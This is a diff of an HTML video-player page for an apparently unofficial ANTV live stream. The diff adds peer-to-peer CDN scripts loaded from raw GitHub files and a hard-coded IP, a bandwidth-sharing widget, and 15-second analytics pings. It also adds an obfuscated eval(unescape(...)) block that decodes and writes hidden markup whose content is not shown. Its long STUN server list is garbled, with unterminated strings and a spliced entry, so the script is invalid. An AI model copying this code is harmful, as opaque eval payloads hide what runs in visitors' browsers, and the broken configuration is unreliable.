@@ -1,6 +1,6 @@
 <HTML style="overflow:auto;">
 <HEAD>
-<title>Streaming ANTV - opentv.pages.dev</title>
+<title></title>
 <meta name="generator" content="JDiff v1.1.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE-edge">
@@ -13,7 +13,10 @@
 <meta name="dns-prefetch" content="https://cdnjs.cloudflare.com">
 <meta name="dns-prefetch" content="https://unpkg.com">
 <meta name="dns-prefetch" content="https://raw.githubusercontent.com">
-<meta name="dns-prefetch" content="//peerjs.jairagne.ovh">
+<meta name="dns-prefetch" content="https://peerjs.jairagne.ovh">
+<meta name="dns-prefetch" content="https://ctrl.laotv.la">
+<meta name="dns-prefetch" content="https://rbmn-live.akamaized.net">
+<meta name="dns-prefetch" content="https://image.discovery.indazn.com">
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 <meta name="mobile-web-app-capable" content="yes" />
 <link href="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.css" rel="stylesheet">
@@ -57,11 +60,15 @@ canvas {
 .vjs-default-skin .vjs-big-play-button {
   font-size: 3em;
   line-height: 1.5em;
+  color: #1DA1F2;
+  border-radius: 50%;
   height: 1.5em;
   width: 3em;
   /* 0.06666em = 2px default */
   border: 0.06666em solid #fff;
   /* 0.3em = 9px default */
+  border: 2px solid #1DA1F2; /* Ganti warna border menjadi warna biru Twitter (#1DA1F2) */
+  border-radius: 50%; /* Set border-radius menjadi setengah dari tinggi */
   border-radius: 0.3em;
   /* Align center */
   left: 50%;
@@ -334,19 +341,261 @@ img#vjs-logobrand-image {
 .vjs-user-inactive.vjs-paused img#vjs-logobrand-image {
 	visibility: visible;
 }
-.vjs-ad-playing a#vjs-logobrand-image-destination {
-	display: none;
-}
+
 </style>
+<script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
+<script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/videojs.hls.orig.js"></script>
+<script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/peer.js"></script>
+<script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/apiCDNP2P.js"></script>
+<script>
+  apiCDNP2P({host:"52.38.144.179",port:"9000",key: 'peerjs',debug:3,secure:true,config: {
+  iceServers: [
+{ urls: 'stun:stun.l.google.com:19302' },
+{ urls: 'stun:stun1.l.google.com:19302' },
+{ urls: 'stun:stun2.l.google.com:19302' },
+{ urls: 'stun.1und1.de:3478' },
+{ urls: 'stun.gmx.net:3478' },
+{ urls: 'stun.l.google.com:19302
+{ urls: 'stun1.l.google.com:19302
+{ urls: 'stun2.l.google.com:19302
+{ urls: 'stun3.l.google.com:19302
+{ urls: 'stun4.l.google.com:19302
+{ urls: '23.21.150.121:3478' },
+{ urls: 'iphone-stun.strato-iphone.de:3478' },
+{ urls: 'numb.viagenie.ca:3478' },
+{ urls: 'stun.12connect.com:3478' },
+{ urls: 'stun.12voip.com:3478' },
+{ urls: 'stun.1und1.de:3478' },
+{ urls: 'stun.2talk.co.nz:3478' },
+{ urls: 'stun.2talk.com:3478' },
+{ urls: 'stun.3clogic.com:3478' },
+{ urls: 'stun.3cx.com:3478' },
+{ urls: 'stun.a-mm.tv:3478' },
+{ urls: 'stun.aa.net.uk:3478' },
+{ urls: 'stun.acrobits.cz:3478' },
+{ urls: 'stun.actionvoip.com:3478' },
+{ urls: 'stun.advfn.com:3478' },
+{ urls: 'stun.aeta-audio.com:3478' },
+{ urls: 'stun.aeta.com:3478' },
+{ urls: 'stun.altar.com.pl:3478' },
+{ urls: 'stun.annatel.net:3478' },
+{ urls: 'stun.antisip.com:3478' },
+{ urls: 'stun.arbuz.ru:3478' },
+{ urls: 'stun.avigora.fr:3478' },
+{ urls: 'stun.awa-shima.com:3478' },
+{ urls: 'stun.b2b2c.ca:3478' },
+{ urls: 'stun.bahnhof.net:3478' },
+{ urls: 'stun.barracuda.com:3478' },
+{ urls: 'stun.bluesip.net:3478' },
+{ urls: 'stun.bmwgs.cz:3478' },
+{ urls: 'stun.botonakis.com:3478' },
+{ urls: 'stun.budgetsip.com:3478' },
+{ urls: 'stun.cablenet-as.net:3478' },
+{ urls: 'stun.callromania.ro:3478' },
+{ urls: 'stun.callwithus.com:3478' },
+{ urls: 'stun.chathelp.ru:3478' },
+{ urls: 'stun.cheapvoip.com:3478' },
+{ urls: 'stun.ciktel.com:3478' },
+{ urls: 'stun.cloopen.com:3478' },
+{ urls: 'stun.comfi.com:3478' },
+{ urls: 'stun.commpeak.com:3478' },
+{ urls: 'stun.comtube.com:3478' },
+{ urls: 'stun.comtube.ru:3478' },
+{ urls: 'stun.cope.es:3478' },
+{ urls: 'stun.counterpath.com:3478' },
+{ urls: 'stun.counterpath.net:3478' },
+{ urls: 'stun.datamanagement.it:3478' },
+{ urls: 'stun.dcalling.de:3478' },
+{ urls: 'stun.demos.ru:3478' },
+{ urls: 'stun.develz.org:3478' },
+{ urls: 'stun.dingaling.ca:3478' },
+{ urls: 'stun.doublerobotics.com:3478' },
+{ urls: 'stun.dus.net:3478' },
+{ urls: 'stun.easycall.pl:3478' },
+{ urls: 'stun.easyvoip.com:3478' },
+{ urls: 'stun.ekiga.net:3478' },
+{ urls: 'stun.epygi.com:3478' },
+{ urls: 'stun.etoilediese.fr:3478' },
+{ urls: 'stun.faktortel.com.au:3478' },
+{ urls: 'stun.freecall.com:3478' },
+{ urls: 'stun.freeswitch.org:3478' },
+{ urls: 'stun.freevoipdeal.com:3478' },
+{ urls: 'stun.gmx.de:3478' },
+{ urls: 'stun.gmx.net:3478' },
+{ urls: 'stun.gradwell.com:3478' },
+{ urls: 'stun.halonet.pl:3478' },
+{ urls: 'stun.hellonanu.com:3478' },
+{ urls: 'stun.hoiio.com:3478' },
+{ urls: 'stun.hosteurope.de:3478' },
+{ urls: 'stun.ideasip.com:3478' },
+{ urls: 'stun.infra.net:3478' },
+{ urls: 'stun.internetcalls.com:3478' },
+{ urls: 'stun.intervoip.com:3478' },
+{ urls: 'stun.ipcomms.net:3478' },
+{ urls: 'stun.ipfire.org:3478' },
+{ urls: 'stun.ippi.fr:3478' },
+{ urls: 'stun.ipshka.com:3478' },
+{ urls: 'stun.irian.at:3478' },
+{ urls: 'stun.it1.hr:3478' },
+{ urls: 'stun.ivao.aero:3478' },
+{ urls: 'stun.jumblo.com:3478' },
+{ urls: 'stun.justvoip.com:3478' },
+{ urls: 'stun.kanet.ru:3478' },
+{ urls: 'stun.kiwilink.co.nz:3478' },
+{ urls: 'stun.l.google.com:19302
+{ urls: 'stun.linea7.net:3478' },
+{ urls: 'stun.linphone.org:3478' },
+{ urls: 'stun.liveo.fr:3478' },
+{ urls: 'stun.lowratevoip.com:3478' },
+{ urls: 'stun.lugosoft.com:3478' },
+{ urls: 'stun.lundimatin.fr:3478' },
+{ urls: 'stun.magnet.ie:3478' },
+{ urls: 'stun.mgn.ru:3478' },
+{ urls: 'stun.mit.de:3478' },
+{ urls: 'stun.mitake.com.tw:3478' },
+{ urls: 'stun.miwifi.com:3478' },
+{ urls: 'stun.modulus.gr:3478' },
+{ urls: 'stun.myvoiptraffic.com:3478' },
+{ urls: 'stun.mywatson.it:3478' },
+{ urls: 'stun.nas.net:3478' },
+{ urls: 'stun.neotel.co.za:3478' },
+{ urls: 'stun.netappel.com:3478' },
+{ urls: 'stun.netgsm.com.tr:3478' },
+{ urls: 'stun.nfon.net:3478' },
+{ urls: 'stun.noblogs.org:3478' },
+{ urls: 'stun.noc.ams-ix.net:3478' },
+{ urls: 'stun.nonoh.net:3478' },
+{ urls: 'stun.nottingham.ac.uk:3478' },
+{ urls: 'stun.nova.is:3478' },
+{ urls: 'stun.on.net.mk:3478' },
+{ urls: 'stun.ooma.com:3478' },
+{ urls: 'stun.ooonet.ru:3478' },
+{ urls: 'stun.oriontelekom.rs:3478' },
+{ urls: 'stun.outland-net.de:3478' },
+{ urls: 'stun.ozekiphone.com:3478' },
+{ urls: 'stun.personal-voip.de:3478' },
+{ urls: 'stun.phone.com:3478' },
+{ urls: 'stun.pjsip.org:3478' },
+{ urls: 'stun.poivy.com:3478' },
+{ urls: 'stun.powerpbx.org:3478' },
+{ urls: 'stun.powervoip.com:3478' },
+{ urls: 'stun.ppdi.com:3478' },
+{ urls: 'stun.qq.com:3478' },
+{ urls: 'stun.rackco.com:3478' },
+{ urls: 'stun.rapidnet.de:3478' },
+{ urls: 'stun.rb-net.com:3478' },
+{ urls: 'stun.rixtelecom.se:3478' },
+{ urls: 'stun.rockenstein.de:3478' },
+{ urls: 'stun.rolmail.net:3478' },
+{ urls: 'stun.rynga.com:3478' },
+{ urls: 'stun.schlund.de:3478' },
+{ urls: 'stun.services.mozilla.com:3478' },
+{ urls: 'stun.sigmavoip.com:3478' },
+{ urls: 'stun.sip.us:3478' },
+{ urls: 'stun.sipdiscount.com:3478' },
+{ urls: 'stun.sipgate.net:10000
+{ urls: 'stun.sipgate.net:3478' },
+{ urls: 'stun.siplogin.de:3478' },
+{ urls: 'stun.sipnet.net:3478' },
+{ urls: 'stun.sipnet.ru:3478' },
+{ urls: 'stun.siportal.it:3478' },
+{ urls: 'stun.sippeer.dk:3478' },
+{ urls: 'stun.siptraffic.com:3478' },
+{ urls: 'stun.skylink.ru:3478' },
+{ urls: 'stun.sma.de:3478' },
+{ urls: 'stun.smartvoip.com:3478' },
+{ urls: 'stun.smsdiscount.com:3478' },
+{ urls: 'stun.snafu.de:3478' },
+{ urls: 'stun.softjoys.com:3478' },
+{ urls: 'stun.solcon.nl:3478' },
+{ urls: 'stun.solnet.ch:3478' },
+{ urls: 'stun.sonetel.com:3478' },
+{ urls: 'stun.sonetel.net:3478' },
+{ urls: 'stun.sovtest.ru:3478' },
+{ urls: 'stun.speedy.com.ar:3478' },
+{ urls: 'stun.spokn.com:3478' },
+{ urls: 'stun.srce.hr:3478' },
+{ urls: 'stun.ssl7.net:3478' },
+{ urls: 'stun.stunprotocol.org:3478' },
+{ urls: 'stun.symform.com:3478' },
+{ urls: 'stun.symplicity.com:3478' },
+{ urls: 'stun.t-online.de:3478' },
+{ urls: 'stun.tagan.ru:3478' },
+{ urls: 'stun.teachercreated.com:3478' },
+{ urls: 'stun.tel.lu:3478' },
+{ urls: 'stun.telbo.com:3478' },
+{ urls: 'stun.telefacil.com:3478' },
+{ urls: 'stun.tng.de:3478' },
+{ urls: 'stun.twt.it:3478' },
+{ urls: 'stun.u-blox.com:3478' },
+{ urls: 'stun.ucsb.edu:3478' },
+{ urls: 'stun.ucw.cz:3478' },
+{ urls: 'stun.uls.co.za:3478' },
+{ urls: 'stun.unseen.is:3478' },
+{ urls: 'stun.usfamily.net:3478' },
+{ urls: 'stun.veoh.com:3478' },
+{ urls: 'stun.vidyo.com:3478' },
+{ urls: 'stun.vipgroup.net:3478' },
+{ urls: 'stun.viva.gr:3478' },
+{ urls: 'stun.vivox.com:3478' },
+{ urls: 'stun.vline.com:3478' },
+{ urls: 'stun.vo.lu:3478' },
+{ urls: 'stun.vodafone.ro:3478' },
+{ urls: 'stun.voicetrading.com:3478' },
+{ urls: 'stun.voip.aebc.com:3478' },
+{ urls: 'stun.voip.blackberry.com:3478' },
+{ urls: 'stun.voip.eutelia.it:3478' },
+{ urls: 'stun.voiparound.com:3478' },
+{ urls: 'stun.voipblast.com:3478' },
+{ urls: 'stun.voipbuster.com:3478' },
+{ urls: 'stun.voipbusterpro.com:3478' },
+{ urls: 'stun.voipcheap.co.uk:3478' },
+{ urls: 'stun.voipcheap.com:3478' },
+{ urls: 'stun.voipfibre.com:3478' },
+{ urls: 'stun.voipgain.com:3478' },
+{ urls: 'stun.voipgate.com:3478' },
+{ urls: 'stun.voipinfocenter.com:3478' },
+{ urls: 'stun.voipplanet.nl:3478' },
+{ urls: 'stun.voippro.com:3478' },
+{ urls: 'stun.voipraider.com:3478' },
+{ urls: 'stun.voip{ urls: 'stunt.com:3478' },
+{ urls: 'stun.voipwise.com:3478' },
+{ urls: 'stun.voipzoom.com:3478' },
+{ urls: 'stun.vopium.com:3478' },
+{ urls: 'stun.voxox.com:3478' },
+{ urls: 'stun.voys.nl:3478' },
+{ urls: 'stun.voztele.com:3478' },
+{ urls: 'stun.vyke.com:3478' },
+{ urls: 'stun.webcalldirect.com:3478' },
+{ urls: 'stun.whoi.edu:3478' },
+{ urls: 'stun.wifirst.net:3478' },
+{ urls: 'stun.wwdl.net:3478' },
+{ urls: 'stun.xs4all.nl:3478' },
+{ urls: 'stun.xtratelecom.es:3478' },
+{ urls: 'stun.yesss.at:3478' },
+{ urls: 'stun.zadarma.com:3478' },
+{ urls: 'stun.zadv.com:3478' },
+{ urls: 'stun.zoiper.com:3478' },
+{ urls: 'stun1.faktortel.com.au:3478' },
+{ urls: 'stun1.l.google.com:19302' },
+{ urls: 'stun1.voiceeclipse.net:3478' },
+{ urls: 'stun2.l.google.com:19302' },
+{ urls: 'stun3.l.google.com:19302' },
+{ urls: 'stun4.l.google.com:19302' },
+{ urls: 'stunserver.org:3478' }
+  ]
+}});
+</script>
+<script async src="https://arc.io/widget.min.js#JMAhfwPS"></script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-MG63VVPYHZ"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
-  gtag('config', 'G-MG63VVPYHZ');	
-    <script>
-      var tag = document.createElement("script");
+  gtag('config', 'G-MG63VVPYHZ');
+</script>  
+<script>
+  var tag = document.createElement("script");
 tag.src = "https://www.googletagmanager.com/gtag/js?id=G-MG63VVPYHZ";
 var firstScriptTag = document.getElementsByTagName("script")[0];
 firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
@@ -358,22 +607,88 @@ tag.onload = function() {
   gtag("config", "G-MG63VVPYHZ");
 
   setInterval(function() {
-    gtag("event", "page_view", {
-      page_location: window.location.href,
-      page_title: document.title
-    });
+gtag("event", "page_view", {
+  page_location: window.location.href,
+  page_title: document.title
+});
   }, 15000);
 };
-    </script>
-<script async src="https://arc.io/widget.min.js#JMAhfwPS"></script>
-<script>
-  apiCDNP2P({host:"peerjs.jairagne.ovh",port:"9000",key: 'peerjs',debug:3});
 </script>
+
 </HEAD>
+<BODY topmargin=0 leftmargin=0 style="background:transparent;background-color:#000000">
+<script src="https://raw.githubusercontent.com/Mewte/videojs-logobrand/master/src/videojs.logobrand.js"></script>
+<div id='vplayer'>
 <script type="text/javascript">
 <!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6f%36%34%36%39%61%33%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%31%36%34%38%34%30%36%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%35%32%34%30%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6f%36%34%36%39%61%33%32%28%27') + '%30%3b%4e%3b%50%1a%6c%6e%6f%65%5f%6c%61%65%6f%30%2f%19%66%5d%67%6b%65%5f%6c%61%65%6f%30%2f%19%6d%6c%74%63%5d%33%1c%5c%5d%5a%62%64%6f%69%6d%6f%5b%36%6a%6c%5b%6e%6a%6d%5e%6f%5f%6a%69%30%5e%5f%5d%65%67%6b%6e%6a%6b%5e%25%5a%6c%64%6d%6c%34%1b%2d%2d%2f%29%2a%28%1b%3d%05%00%07%04%01%03%31%68%5e%6c%61%6d%6b%18%69%6c%5d%31%1b%65%6b%6d%6a%6f%33%2c%2b%68%5b%71%2e%66%64%6b%61%6f%5e%68%68%5d%68%5d%69%6e%69%58%6d%6d%28%5f%6e%62%2b%47%6c%5b%67%6f%58%2c%49%3d%3c%4f%2c%65%5f%6d%6e%59%6b%2e%58%65%63%5d%6f%6b%2b%60%6d%29%6c%58%58%69%2b%64%6f%1b%3d%34%2d%6d%5d%6a%64%6d%6b%3b%07%06%31%68%5f%68%63%6a%68%1d%6a%69%5e%37%1e%65%6b%6c%6e%6d%34%2f%2e%6b%5e%72%28%63%64%6b%60%6b%5c%6f%6b%58%6b%58%6a%68%6c%58%6d%6c%2c%5d%69%61%2e%44%69%58%61%6a%58%2c%48%39%3e%48%2f%60%5c%68%6d%5f%6e%2e%58%64%67%5f%68%68%2e%63%68%2a%5b%68%64%38%3c%4c%4a%2c%4c%2f%63%68%1f%38%34%2e%68%5f%68%63%6a%68%3f%00%01%35%6d%5f%6b%66%68%6a%1a%6d%6a%5a%30%19%61%6e%6c%6d%68%36%2d%29%70%62%6a%2f%71%5c%68%5f%59%6d%2a%6c%5f%6e%2f%64%58%37%2a%2b%2a%2c%2d%2e%2d%70%63%58%58%6e%61%6e%27%61%58%37%2a%63%63%68%2e%63%6a%19%3b%36%2b%6a%58%6e%67%6a%6e%3e%00%03%33%6e%5d%6e%64%6f%6c%1e%6d%6c%5b%30%1b%67%6d%6e%68%6a%31%2b%2d%6c%5b%77%2f%66%66%6d%62%6d%5b%6a%6f%5b%6c%5d%6f%6f%69%5a%6b%6e%2a%5a%6c%65%2d%47%5f%77%69%58%2c%73%63%5c%58%6c%66%69%27%66%6f%66%6e%59%6f%5b%6a%59%2c%65%5f%6d%6e%59%6b%2e%68%6f%5d%2b%77%66%5c%5b%69%64%6b%2f%61%6c%62%69%5e%6b%5e%6a%5a%28%64%6b%1b%3f%33%2a%6d%5f%6b%66%68%6a%38%07%02%00%03%33%5d%63%72%1d%66%5c%33%21%70%6c%61%5c%76%5c%6c%23%3f%02%06%32%70%63%58%58%6e%1f%60%5e%35%1b%75%66%69%6a%66%5d%74%58%69%1f%1a%5f%61%5e%6f%69%37%1c%76%64%59%5a%6a%27%66%6a%1f%72%60%6d%27%58%58%67%5e%6c%66%6c%20%68%67%67%68%1c%1c%6a%69%76%65%5f%35%1b%74%61%5a%6e%62%32%2c%2d%2f%1c%35%60%58%66%63%66%6e%34%2d%2d%2d%1a%36%6e%5d%75%6b%25%5f%66%63%67%6f%33%58%5c%68%6c%58%69%37%18%1a%71%65%59%69%67%34%1c%29%2d%2f%1d%18%1a%62%59%64%66%67%6d%37%1e%2c%2f%28%1b%1c%1a%5b%6e%6f%6b%6f%69%64%6a%32%1e%6a%6c%6f%59%1b%1d%6f%6a%6d%6c%58%69%35%18%62%6e%68%6d%6a%31%2a%29%6b%6d%5a%6a%6a%70%28%6c%5c%66%5a%6e%28%5c%58%75%2b%58%5b%68%6e%58%6b%2d%72%5f%5e%6d%19%18%5f%6f%6e%6f%6d%61%5e%70%1a%5f%6e%6d%6c%68%69%66%6b%1d%6d%69%5c%66%6b%5c%5b%35%18%5b%6f%68%6e%1b%1f%69%66%59%74%68%61%6c%66%63%6e%58%1d%74%5c%5c%67%64%6b%25%6e%66%5b%75%6a%64%6d%65%63%6a%58%3d%05%00%07%04%05%04%31%68%6a%6f%6e%5a%5a%18%69%6c%5d%31%1b%65%6b%6d%6a%6f%33%2c%2b%6d%6a%27%67%6b%6e%6a%69%2b%25%6a%74%61%64%6e%6d%59%6b%77%5a%61%5e%25%2c%2d%5c%5b%68%6d%2e%69%77%2c%61%29%60%2b%28%2d%2d%2a%2b%2e%60%2a%6a%31%1c%18%69%76%68%5b%37%21%5d%6d%6d%63%60%5d%59%69%66%6b%6c%29%70%6e%59%2f%5e%69%6a%64%58%2d%65%6e%5f%61%69%6b%61%24%19%66%59%5b%5a%64%33%21%4d%38%26%1d%69%5c%6d%35%26%2b%30%2e%21%38%01%03%04%06%35%6d%6b%68%69%5f%5b%1a%6d%6a%5a%30%19%61%6e%6c%6d%68%36%2d%29%69%6c%20%66%69%6a%6f%68%2c%22%6f%75%63%60%68%6a%58%69%73%5f%60%59%22%29%2c%5e%5f%6e%6a%2f%6b%73%29%60%2e%67%2e%29%2f%29%2c%2b%2f%62%2e%6f%30%1b%1f%6c%77%6a%5f%31%26%5c%6f%69%66%61%5a%5e%6c%67%69%68%2f%77%6f%5b%2b%5b%68%6d%63%5d%2c%67%6a%59%66%68%69%65%21%18%61%5e%5e%5b%66%37%27%45%39%24%19%6c%5d%6a%32%23%2b%31%30%27%3f%00%01%04%04%18%1d%1f%34%2d%70%63%58%58%6e%3d%35%29%5c%64%75%3a%32%29%5e%65%77%3f%02%07%36%6f%5a%69%61%6e%6e%1a%6b%6b%5a%32%22%62%6c%69%6f%6f%30%29%29%76%63%6a%2d%77%5f%6a%5a%5b%6a%2c%68%5f%68%2e%28%22%6c%68%6f%5c%65%5d%2d%70%63%58%58%6e%2d%67%6d%23%3f%33%2b%69%5d%6c%65%6d%69%3d%04%04%18%1d%33%6f%59%6c%63%6c%69%1d%68%6f%5d%35%1b%67%6c%6a%6a%6d%32%2e%2e%58%5d%68%66%6a%2d%5f%62%69%6f%58%67%61%5e%6f%5f%2a%5a%6c%65%2d%5b%64%5d%75%2e%63%60%5c%6f%2e%61%69%6b%5f%6c%75%2e%2b%2d%28%28%2f%2e%61%69%6b%5f%6c%75%2f%60%66%6b%28%66%6a%19%3a%32%29%6d%5b%6b%64%6f%6d%38%05%03%33%6f%59%6c%63%6c%69%1d%68%6f%5d%35%1b%67%6c%6a%6a%6d%32%2e%2e%6a%6b%6a%67%66%2d%5f%6d%67%29%76%64%59%5a%6a%64%6f%20%65%64%5f%6d%62%2f%59%64%68%6d%29%72%64%5b%5d%6d%64%6d%21%67%61%5e%6e%62%2a%63%68%1e%3c%36%29%6b%5a%6b%66%69%6e%3a%00%01%34%69%5d%6c%65%6d%69%1f%6e%6c%5f%30%19%60%6a%6e%6a%6b%33%2e%2c%6c%68%68%62%64%2a%59%69%67%2f%77%64%5b%5c%69%66%6a%22%5f%6d%68%6e%6a%64%5b%22%61%66%6f%2e%5b%61%69%6e%29%76%64%59%5a%6a%64%6f%20%58%6b%6c%6e%6c%65%5b%20%67%65%6d%2a%63%68%1e%3c%36%29%6b%5a%6b%66%69%6e%3a%00%01%34%69%5d%6c%65%6d%69%1f%6e%6c%5f%30%19%60%6a%6e%6a%6b%33%2e%2c%6c%6d%5d%2f%65%6b%6c%6e%5b%77%58%6a%6c%64%5f%2a%5a%6c%65%2d%60%2e%58%5c%35%29%2c%2b%5e%35%2d%66%69%1c%38%30%2e%6a%58%6f%63%68%69%3d%05%00%36%6d%5b%6b%64%6f%6d%1a%6f%6b%58%35%18%62%6e%68%6d%6a%31%2a%29%6e%5c%74%63%67%6e%28%5b%6e%60%2c%64%65%60%5c%71%6b%74%29%70%65%59%58%6c%67%6d%25%6b%5a%6f%6d%66%6f%68%64%6e%6d%24%6d%73%64%6b%5f%66%5f%6c%2f%60%5c%68%6d%5f%6e%2e%63%61%58%29%70%65%59%58%6c%67%6d%25%6b%5a%6f%6d%66%6f%68%64%6e%6d%24%6d%73%64%6b%5f%66%5f%6c%2e%63%6a%19%3b%36%2b%6a%58%6e%67%6a%6e%3e%1d%1d%02%07%36%6f%5a%69%61%6e%6e%38%01%03%1d%1f%19%1a%20%67%6a%6a%59%6e%63%6f%6f%25%74%60%68%5c%6e%74%24%1e%70%63%58%58%6e%61%6e%23%18%72%02%06%1e%1a%1a%1c%1d%1d%75%58%6c%18%58%77%59%63%6a%66%59%4d%61%5e%70%5f%6e%1d%32%18%75%63%68%58%6e%76%2d%5c%72%59%60%6f%64%5b%4a%66%5d%74%58%69%19%37%18%77%66%5c%5b%69%64%6b%25%26%75%67%6d%68%61%5e%71%5b%6c%21%25%32%00%01%19%1a%18%58%77%59%63%6a%66%59%4d%61%5e%70%5f%6e%2f%63%6b%65%69%5c%6a%5c%6f%5b%21%75%05%03%06%01%07%03%63%61%5c%66%5a%37%1a%1e%65%6b%6c%6e%6d%34%2f%2e%6e%6f%5c%68%6c%77%2d%68%5f%61%5f%6b%2f%59%5a%73%29%61%60%64%2b%62%69%61%6f%20%6d%63%58%73%5d%6b%2d%68%6c%61%1c%20%1d%2e%2c%60%67%59%66%5a%18%6a%69%1a%69%6a%58%02%07%03%01%04%06%5c%5b%6d%6e%65%6f%5c%6b%60%69%6a%33%1f%1e%66%6e%6e%6c%33%2e%2c%72%71%73%2f%75%61%5a%5f%69%62%6a%2f%58%6a%67%2b%1b%1f%2b%2d%5e%5f%6b%69%64%6d%58%6e%61%6e%6d%18%75%62%5f%6e%1d%5a%63%60%5d%67%58%5b%05%00%03%03%05%70%24%30%04%04%05%03%1f%18%1e%1a%77%24%76%64%6d%5d%69%73%21%1f%73%67%68%5e%6f%76%2f%75%60%5e%5d%6e%61%6f%27%23%35%01%03%04%6f%65%6f%63%64%6d%6f%30%1a%75%01%03%04%06%00%70%61%59%5a%6b%40%6d%4c%59%6a%6e%63%6c%6e%61%6e%6d%4f%75%63%6e%5b%65%58%69%37%1a%77%00%01%01%07%03%1a%1c%1d%1d%6a%60%34%18%69%69%6d%5b%26%07%02%04%04%06%00%5e%5d%67%5e%6d%62%6e%34%1c%26%60%66%5d%21%24%00%01%01%07%03%03%58%74%6f%5e%64%63%5f%41%5e%5e%5b%66%34%1c%67%5c%63%6e%5f%05%03%06%01%07%77%07%02%04%04%72%04%04%01%70%23%18%64%6f%68%5b%69%64%6c%6b%22%21%72%02%06%07%03%70%5d%6b%1d%6f%65%5b%71%58%69%18%33%1a%6e%64%64%6a%30%04%04%01%04%6f%64%5f%73%5f%6a%2f%6e%6d%21%21%6e%58%68%6b%62%6f%6e%65%6e%6f%58%61%5b%6a%66%5a%23%22%1a%60%69%6f%5a%6b%60%69%6a%25%26%77%03%04%03%05%04%5a%6c%6b%6d%6b%61%5a%2a%67%68%60%6f%25%26%48%6a%6f%6e%5a%5a%18%59%62%5b%6e%66%58%5b%22%23%05%03%72%21%31%07%04%1c%1d%31%2c%6e%5d%6e%64%6f%6c%3c%07%04%30%6a%5a%69%60%6a%6c%3f%02%06%74%63%5e%59%6e%63%68%21%21%72%63%68%68%62%5b%73%59%6b%26%26%2b%70%61%59%5a%6b%40%6d%4c%59%6a%6e%63%6c%6e%61%6e%6d%4f%75%63%6e%5b%65%58%69%21%23%05%03%33%2b%69%5d%6c%65%6d%69%3d%04%04%34%6a%58%6e%67%6a%6e%3e%00%03%75%58%6c%18%6d%63%59%77%5f%6c%1c%30%1d%75%60%5e%5d%6e%61%6f%26%21%70%62%6a%6d%63%58%73%5d%6b%24%21%31%07%04%01%03%77%5e%6f%1a%6f%62%66%68%38%5f%62%65%6f%59%39%6c%6e%6c%6e%6d%18%33%1a%6a%60%5c%74%5a%6f%28%5f%6e%6d%6c%68%69%66%3a%5c%6b%2d%58%5e%5c%3a%67%61%62%5e%22%1a%5b%68%6b%6d%69%6a%1b%26%37%03%04%70%5d%6b%1d%68%66%63%68%3b%5a%60%67%68%5e%3a%68%69%6b%6a%68%3c%6e%62%18%33%1a%6d%63%64%6d%39%5c%62%61%6f%5b%3e%6b%6e%6e%6f%6f%2f%5a%65%22%21%32%02%06%69%65%63%6c%3b%58%67%60%68%5c%3b%6a%6c%6a%69%68%38%6e%60%2d%60%68%6a%58%69%40%4a%47%46%1c%30%1d%19%4a%6a%5d%6f%4b%52%18%35%07%02%6a%62%66%69%3c%5d%65%66%6a%5a%3c%6f%68%69%6e%6d%2b%5b%5c%59%38%64%5f%6d%6d%24%1b%5b%6a%6d%6e%6b%6f%38%64%5f%6d%6d%1a%24%32%02%07%1a%18%1d%1f%05%00%6d%65%65%6d%3b%5a%61%63%6a%59%39%6d%6a%6e%69%6e%39%6e%62%2b%69%6a%5a%63%61%59%65%1a%31%1d%67%6a%6b%5d%6c%64%6c%6a%26%23%75%01%03%1d%1f%19%1a%6f%62%66%68%49%2d%47%56%25%20%28%29%23%37%00%01%75%1e%1a%07%02%00%03%75%58%6c%18%6a%60%61%6e%3b%62%59%5c%59%39%6c%6e%6c%6e%6d%18%33%1a%6a%60%5c%74%5a%6f%28%5f%6e%6d%6c%68%69%66%3a%5c%6b%2d%58%5e%5c%3a%67%61%62%5e%22%1a%5b%68%6b%6d%69%6a%1b%26%37%03%04%70%5d%6b%1d%68%66%63%68%3c%67%5d%5f%5e%3c%69%69%69%6c%6b%3e%6b%60%1f%35%1e%6d%65%65%6d%3c%67%5c%5b%5c%3b%6a%6c%6a%69%68%2e%58%61%27%20%35%05%03%68%67%67%6a%3b%64%58%5c%5b%3f%6f%6c%69%6c%6a%3a%69%67%2e%64%6f%6d%5c%6c%40%49%42%44%1e%37%1a%1a%1b%32%02%07%6d%67%64%6f%39%66%5f%5b%58%3b%68%6b%6d%69%6a%2f%5e%5c%5a%3d%66%5d%6a%6a%27%1f%5c%6d%69%6b%6b%6c%3d%66%5d%6a%6a%19%20%35%05%03%1f%18%1e%1a%07%02%6a%62%66%69%3b%60%58%5e%5c%38%6f%6e%68%6e%6f%3b%6a%67%2a%6e%6d%5f%62%63%5d%63%1d%30%1f%63%6f%6a%5a%6b%61%6d%68%22%25%72%00%01%19%1a%18%1d%